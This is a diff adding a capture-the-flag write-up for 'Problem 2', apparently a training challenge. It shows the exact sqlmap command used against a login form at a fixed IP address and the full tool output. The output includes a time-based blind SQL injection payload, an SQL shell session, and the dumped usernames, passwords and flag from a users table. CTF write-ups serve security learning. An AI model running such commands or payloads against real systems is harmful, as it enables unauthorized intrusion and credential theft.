@@ -18,3 +18,156 @@ Flag: flag{y0u_d1dn7_s4y_th3_m4g1q_w0rd}
 
 
 Problem 2:
+
+Sqlmap Command Used: python ~/Projects/sqlmap/sqlmap.py -u "http://104.236.220.65/admin/index.php" --method POST --level 3 --data "username=test&password=test&go=Login"
+
+Flag: flag{d1d_y0u_m4k3_a_GU1_1n_viZu4l_b4siq?}
+
+Output from Sqlmap:
+
+[*] starting at 17:32:25
+
+[17:32:25] [INFO] testing connection to the target URL
+[17:32:26] [INFO] testing if the target URL is stable
+[17:32:26] [INFO] target URL is stable
+[17:32:26] [INFO] testing if POST parameter 'username' is dynamic
+[17:32:27] [WARNING] POST parameter 'username' does not appear to be dynamic
+[17:32:27] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[17:32:27] [INFO] testing for SQL injection on POST parameter 'username'
+[17:32:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:32:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
+[17:32:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[17:32:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[17:32:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[17:32:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[17:32:43] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[17:32:47] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[17:32:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[17:32:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)'
+[17:32:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace'
+[17:32:51] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'
+[17:32:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[17:32:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[17:32:51] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[17:32:51] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[17:32:51] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[17:32:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[17:32:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL) (original value)'
+[17:32:52] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[17:32:52] [INFO] testing 'Boolean-based blind - Parameter replace (CASE) (original value)'
+[17:32:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[17:32:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[17:32:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[17:32:53] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[17:32:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[17:32:53] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[17:32:53] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[17:32:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[17:32:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:32:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[17:33:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[17:33:02] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:33:04] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[17:33:05] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[17:33:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+[17:33:09] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+[17:33:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[17:33:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[17:33:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[17:33:15] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[17:33:17] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[17:33:18] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[17:33:18] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[17:33:18] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[17:33:19] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[17:33:19] [INFO] testing 'Oracle error-based - Parameter replace'
+[17:33:19] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[17:33:19] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[17:33:19] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[17:33:19] [INFO] testing 'MySQL inline queries'
+[17:33:19] [INFO] testing 'PostgreSQL inline queries'
+[17:33:19] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[17:33:19] [INFO] testing 'Oracle inline queries'
+[17:33:19] [INFO] testing 'SQLite inline queries'
+[17:33:19] [INFO] testing 'Firebird inline queries'
+[17:33:19] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[17:33:20] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[17:33:22] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
+[17:33:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[17:33:24] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[17:33:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[17:33:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[17:33:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[17:33:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'
+[17:33:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[17:33:40] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (1) values? [Y/n] y
+[17:36:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[17:36:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[17:36:11] [INFO] target URL appears to be UNION injectable with 1 columns
+[17:36:12] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
+[17:36:12] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[17:36:13] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[17:36:15] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[17:36:16] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[17:36:17] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 1075 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+            Payload: username=test' AND (SELECT * FROM (SELECT(SLEEP(5)))mLQH)-- Elvv&password=test&go=Login
+            ---
+            [17:38:21] [INFO] the back-end DBMS is MySQL
+            web server operating system: Linux Debian 8.0 (jessie)
+            web application technology: Apache 2.4.10
+            back-end DBMS: MySQL >= 5.0.12
+            [17:38:21] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
+            sql-shell> SELECT * from users
+            [17:38:55] [INFO] fetching SQL SELECT statement query output: 'SELECT * from users'
+            [17:38:55] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+            [17:38:55] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+            [17:38:55] [INFO] fetching current database
+            [17:38:55] [INFO] retrieved: 
+            [17:38:55] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+            do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+            [17:39:28] [INFO] adjusting time delay to 1 second due to good response times
+            cc
+            [17:39:31] [INFO] fetching columns for table 'users' in database 'cc'
+            [17:39:31] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+            3
+            [17:39:37] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+            uid
+            [17:39:50] [INFO] retrieved: username
+            [17:40:17] [INFO] retrieved: password
+            [17:40:50] [INFO] the query with expanded column name(s) is: SELECT password, uid, username FROM users
+            [17:40:50] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+            [17:40:50] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+
+            [17:40:58] [WARNING] the SQL query provided does not return any output
+            [17:40:58] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+            sql-shell> SELECT password, uid, username FROM users
+            [17:44:24] [INFO] fetching SQL SELECT statement query output: 'SELECT password, uid, username FROM users'
+            [17:44:24] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+            [17:44:24] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+            5
+            the SQL query provided can return 5 entries. How many entries do you want to retrieve?
+            [a] All (default)
+            [#] Specific number
+            [q] Quit
+            > a
+            [17:44:35] [INFO] retrieved: d0ntst0ph3rek33p
+            [17:46:13] [ERROR] invalid character detected. retrying..
+            [17:46:13] [WARNING] increasing time delay to 2 seconds 
+            g01ng
+            [17:46:56] [INFO] retrieved: 0
+            [17:47:07] [INFO] retrieved: admin
+            [17:47:38] [INFO] retrieved: al1ttl3furth3r
+            [17:49:32] [INFO] retrieved: 1
+            [17:49:37] [INFO] retrieved: dave
+            [17:50:02] [INFO] retrieved: flag{d1d_y0u_m4k3_a_GU1_1n_viZu4l_b4siq?}
+            [17:56:16] [INFO] retrieved: 2
+            [17:56:22] [INFO] retrieved: flag
+            [17:56:49] [INFO] retrieved: submit t
